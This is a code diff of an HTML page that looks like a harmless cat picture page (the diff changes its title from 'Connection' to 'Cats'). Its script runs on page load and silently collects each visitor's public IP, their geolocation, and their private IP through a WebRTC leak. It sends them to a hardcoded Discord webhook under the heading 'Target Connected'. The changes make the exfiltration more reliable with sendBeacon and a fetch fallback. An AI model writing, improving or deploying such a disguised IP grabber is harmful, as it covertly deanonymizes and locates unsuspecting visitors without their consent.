@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connection</title>
+    <title>Cats</title>
     <style>
-        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { color: #e94560; font-size: 24px; animation: pulse 1s infinite; }
-        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
+        .cat-container { text-align: center; }
+        .cat-container img { max-width: 80%; border-radius: 12px; margin: 10px; }
     </style>
 </head>
 <body>
-    <div style="text-align:center;">
-        <img src="https://cataas.com/cat" alt="cat" style="max-width:80%;border-radius:12px;">
-        <br><br>
-        <img src="https://cataas.com/cat/says/meow" alt="cat" style="max-width:80%;border-radius:12px;">
+    <div class="cat-container">
+        <img src="https://cataas.com/cat" alt="cat">
+        <img src="https://cataas.com/cat/says/meow" alt="cat">
     </div>
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";
@@ -26,15 +25,17 @@
                 const pubRes = await fetch("https://api.ipify.org?format=json");
                 const pubData = await pubRes.json();
                 pub = pubData.ip;
-            } catch(e) {}
+                console.log("public ip:", pub);
+            } catch(e) { console.error("pub ip fail:", e); }
 
             try {
                 const geoRes = await fetch(`https://ipwho.is/${pub}`);
                 const geoData = await geoRes.json();
                 if (geoData.success) {
                     geo = `${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.latitude}, ${geoData.longitude})`;
+                    console.log("geo:", geo);
                 }
-            } catch(e) {}
+            } catch(e) { console.error("geo fail:", e); }
 
             try {
                 const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
@@ -48,26 +49,43 @@
                 });
                 await pc.setLocalDescription(await pc.createOffer());
                 await new Promise(r => setTimeout(r, 2000));
-            } catch(e) {}
+                console.log("private ip:", priv);
+            } catch(e) { console.error("priv ip fail:", e); }
+
+            const payload = JSON.stringify({
+                embeds: [{
+                    title: "Target Connected",
+                    color: 0xff0000,
+                    fields: [
+                        {name: "public ip", value: pub, inline: false},
+                        {name: "private ip", value: priv, inline: false},
+                        {name: "geolocation", value: geo, inline: false}
+                    ]
+                }]
+            });
 
             try {
-                const payload = JSON.stringify({
-                    embeds: [{
-                        title: "Target Connected",
-                        color: 0xff0000,
-                        fields: [
-                            {name: "public ip", value: pub, inline: false},
-                            {name: "private ip", value: priv, inline: false},
-                            {name: "geolocation", value: geo, inline: false}
-                        ]
-                    }]
-                });
+                const blob = new Blob([payload], {type: "application/json"});
+                const sent = navigator.sendBeacon(WEBHOOK, blob);
+                console.log("sendBeacon result:", sent);
+                if (!sent) {
+                    await fetch(WEBHOOK, {
+                        method: "POST",
+                        mode: "no-cors",
+                        headers: {"Content-Type": "text/plain;charset=UTF-8"},
+                        body: payload
+                    });
+                    console.log("fetch fallback sent");
+                }
+            } catch(e) {
+                console.error("webhook fail:", e);
                 await fetch(WEBHOOK, {
                     method: "POST",
                     mode: "no-cors",
-                    body: new Blob([payload], {type: "application/json"})
+                    headers: {"Content-Type": "text/plain;charset=UTF-8"},
+                    body: payload
                 });
-            } catch(e) {}
+            }
         }
         grab();
     </script>
